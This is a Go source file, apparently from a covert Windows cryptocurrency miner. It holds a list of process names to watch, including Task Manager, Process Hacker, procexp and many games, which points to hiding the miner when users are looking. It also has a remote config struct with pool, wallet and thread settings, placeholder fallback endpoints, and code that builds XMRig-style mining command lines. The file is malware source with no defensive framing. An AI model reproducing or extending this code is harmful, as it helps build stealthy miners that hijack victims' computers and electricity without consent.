package main

import (
	"fmt"

	"golang.org/x/sys/windows"
)

var processNames = []string{
	"Taskmgr.exe", "ProcessHacker.exe", "tcpview.exe", "perfmon.exe", "procexp.exe", "procexp64.exe",
	"ModernWarfare.exe", "ShooterGame.exe", "ShooterGameServer.exe", "ShooterGame_BE.exe",
	"GenshinImpact.exe", "FactoryGame.exe", "Borderlands2.exe", "EliteDangerous64.exe",
	"PlanetCoaster.exe", "Warframe.x64.exe", "NMS.exe", "RainbowSix.exe", "RainbowSix_BE.exe",
	"CK2game.exe", "ck3.exe", "stellaris.exe", "arma3.exe", "arma3_x64.exe", "TslGame.exe",
	"ffxiv.exe", "ffxiv_dx11.exe", "GTA5.exe", "FortniteClient-Win64-Shipping.exe",
	"r5apex.exe", "VALORANT.exe", "csgo.exe", "PortalWars-Win64-Shipping.exe", "FiveM.exe",
	"left4dead2.exe", "FIFA21.exe", "BlackOpsColdWar.exe", "EscapeFromTarkov.exe",
	"TEKKEN 7.exe", "SRTTR.exe", "DeadByDaylight-Win64-Shipping.exe", "PointBlank.exe",
	"enlisted.exe", "WorldOfTanks.exe", "SoTGame.exe", "FiveM_b2189_GTAProcess.exe",
	"NarakaBladepoint.exe", "re8.exe", "Sonic Colors - Ultimate.exe", "iw6sp64_ship.exe",
	"RocketLeague.exe", "Cyberpunk2077.exe", "FiveM_GTAProcess.exe", "RustClient.exe",
	"Photoshop.exe", "VideoEditorPlus.exe", "AfterFX.exe", "League of Legends.exe",
	"Fallout4.exe", "FarCry5.exe", "RDR2.exe", "Little_Nightmares_II_Enhanced-Win64-Shipping.exe",
	"NBA2K22.exe", "Borderlands3.exe", "LeagueClientUx.exe", "RogueCompany.exe",
	"Tiger-Win64-Shipping.exe", "WatchDogsLegion.exe", "Phasmophobia.exe", "VRChat.exe",
	"NBA2K21.exe", "NarakaBladepoint.exe", "ForzaHorizon4.exe", "acad.exe",
	"AndroidEmulatorEn.exe", "bf4.exe", "zula.exe", "Adobe Premiere Pro.exe", "GenshinImpact.exe",
}

type Res struct {
	Address     string `json:"address"`
	ID          int    `json:"id"`
	IdleThreads int    `json:"idle_threads"`
	IdleTime    int    `json:"idle_time"`
	Password    string `json:"password"`
	Pool        string `json:"pool"`
	Task        string `json:"task"`
	Threads     int    `json:"threads"`
	Ssl         int    `json:"ssl"`
}

var endpoints = []string{

	"https://fallback1.example.com",
	"http://localhost/",
	"https://fallback2.example.com",
}

var miningpool = ""
var mining_wallet = ""
var mining_password = ""
var threads = 0
var idle_time = 0
var idlethreads = 0
var ssl = 0

var lockHandle windows.Handle

func StringToPointer(s string) *string {
	return &s
}

func craftCLI(idle bool) *string {
	if idle {
		if ssl == 1 {
			template := "--donate-level 2 -o %s -u %s -k --tls -p %s --cpu-max-threads-hint=%d"
			cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, idlethreads)
			fmt.Println("formatted cli output: " + cli)
			return StringToPointer(cli)

		} else {
			template := "--donate-level 2 -o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
			cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, idlethreads)
			fmt.Println("formatted cli output: " + cli)

			return StringToPointer(cli)

		}

	} else if ssl == 1 {

		template := "--donate-level 2 -o %s -u %s -k --tls -p %s --cpu-max-threads-hint=%d"
		cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, threads)
		fmt.Println("formatted cli output: " + cli)

		return StringToPointer(cli)
	} else {

		template := "--donate-level 2 -o %s -u %s -k -p %s --cpu-max-threads-hint=%d"
		cli := fmt.Sprintf(template, miningpool, mining_wallet, mining_password, threads)
		fmt.Println("formatted cli output: " + cli)
		return StringToPointer(cli)
	}
}
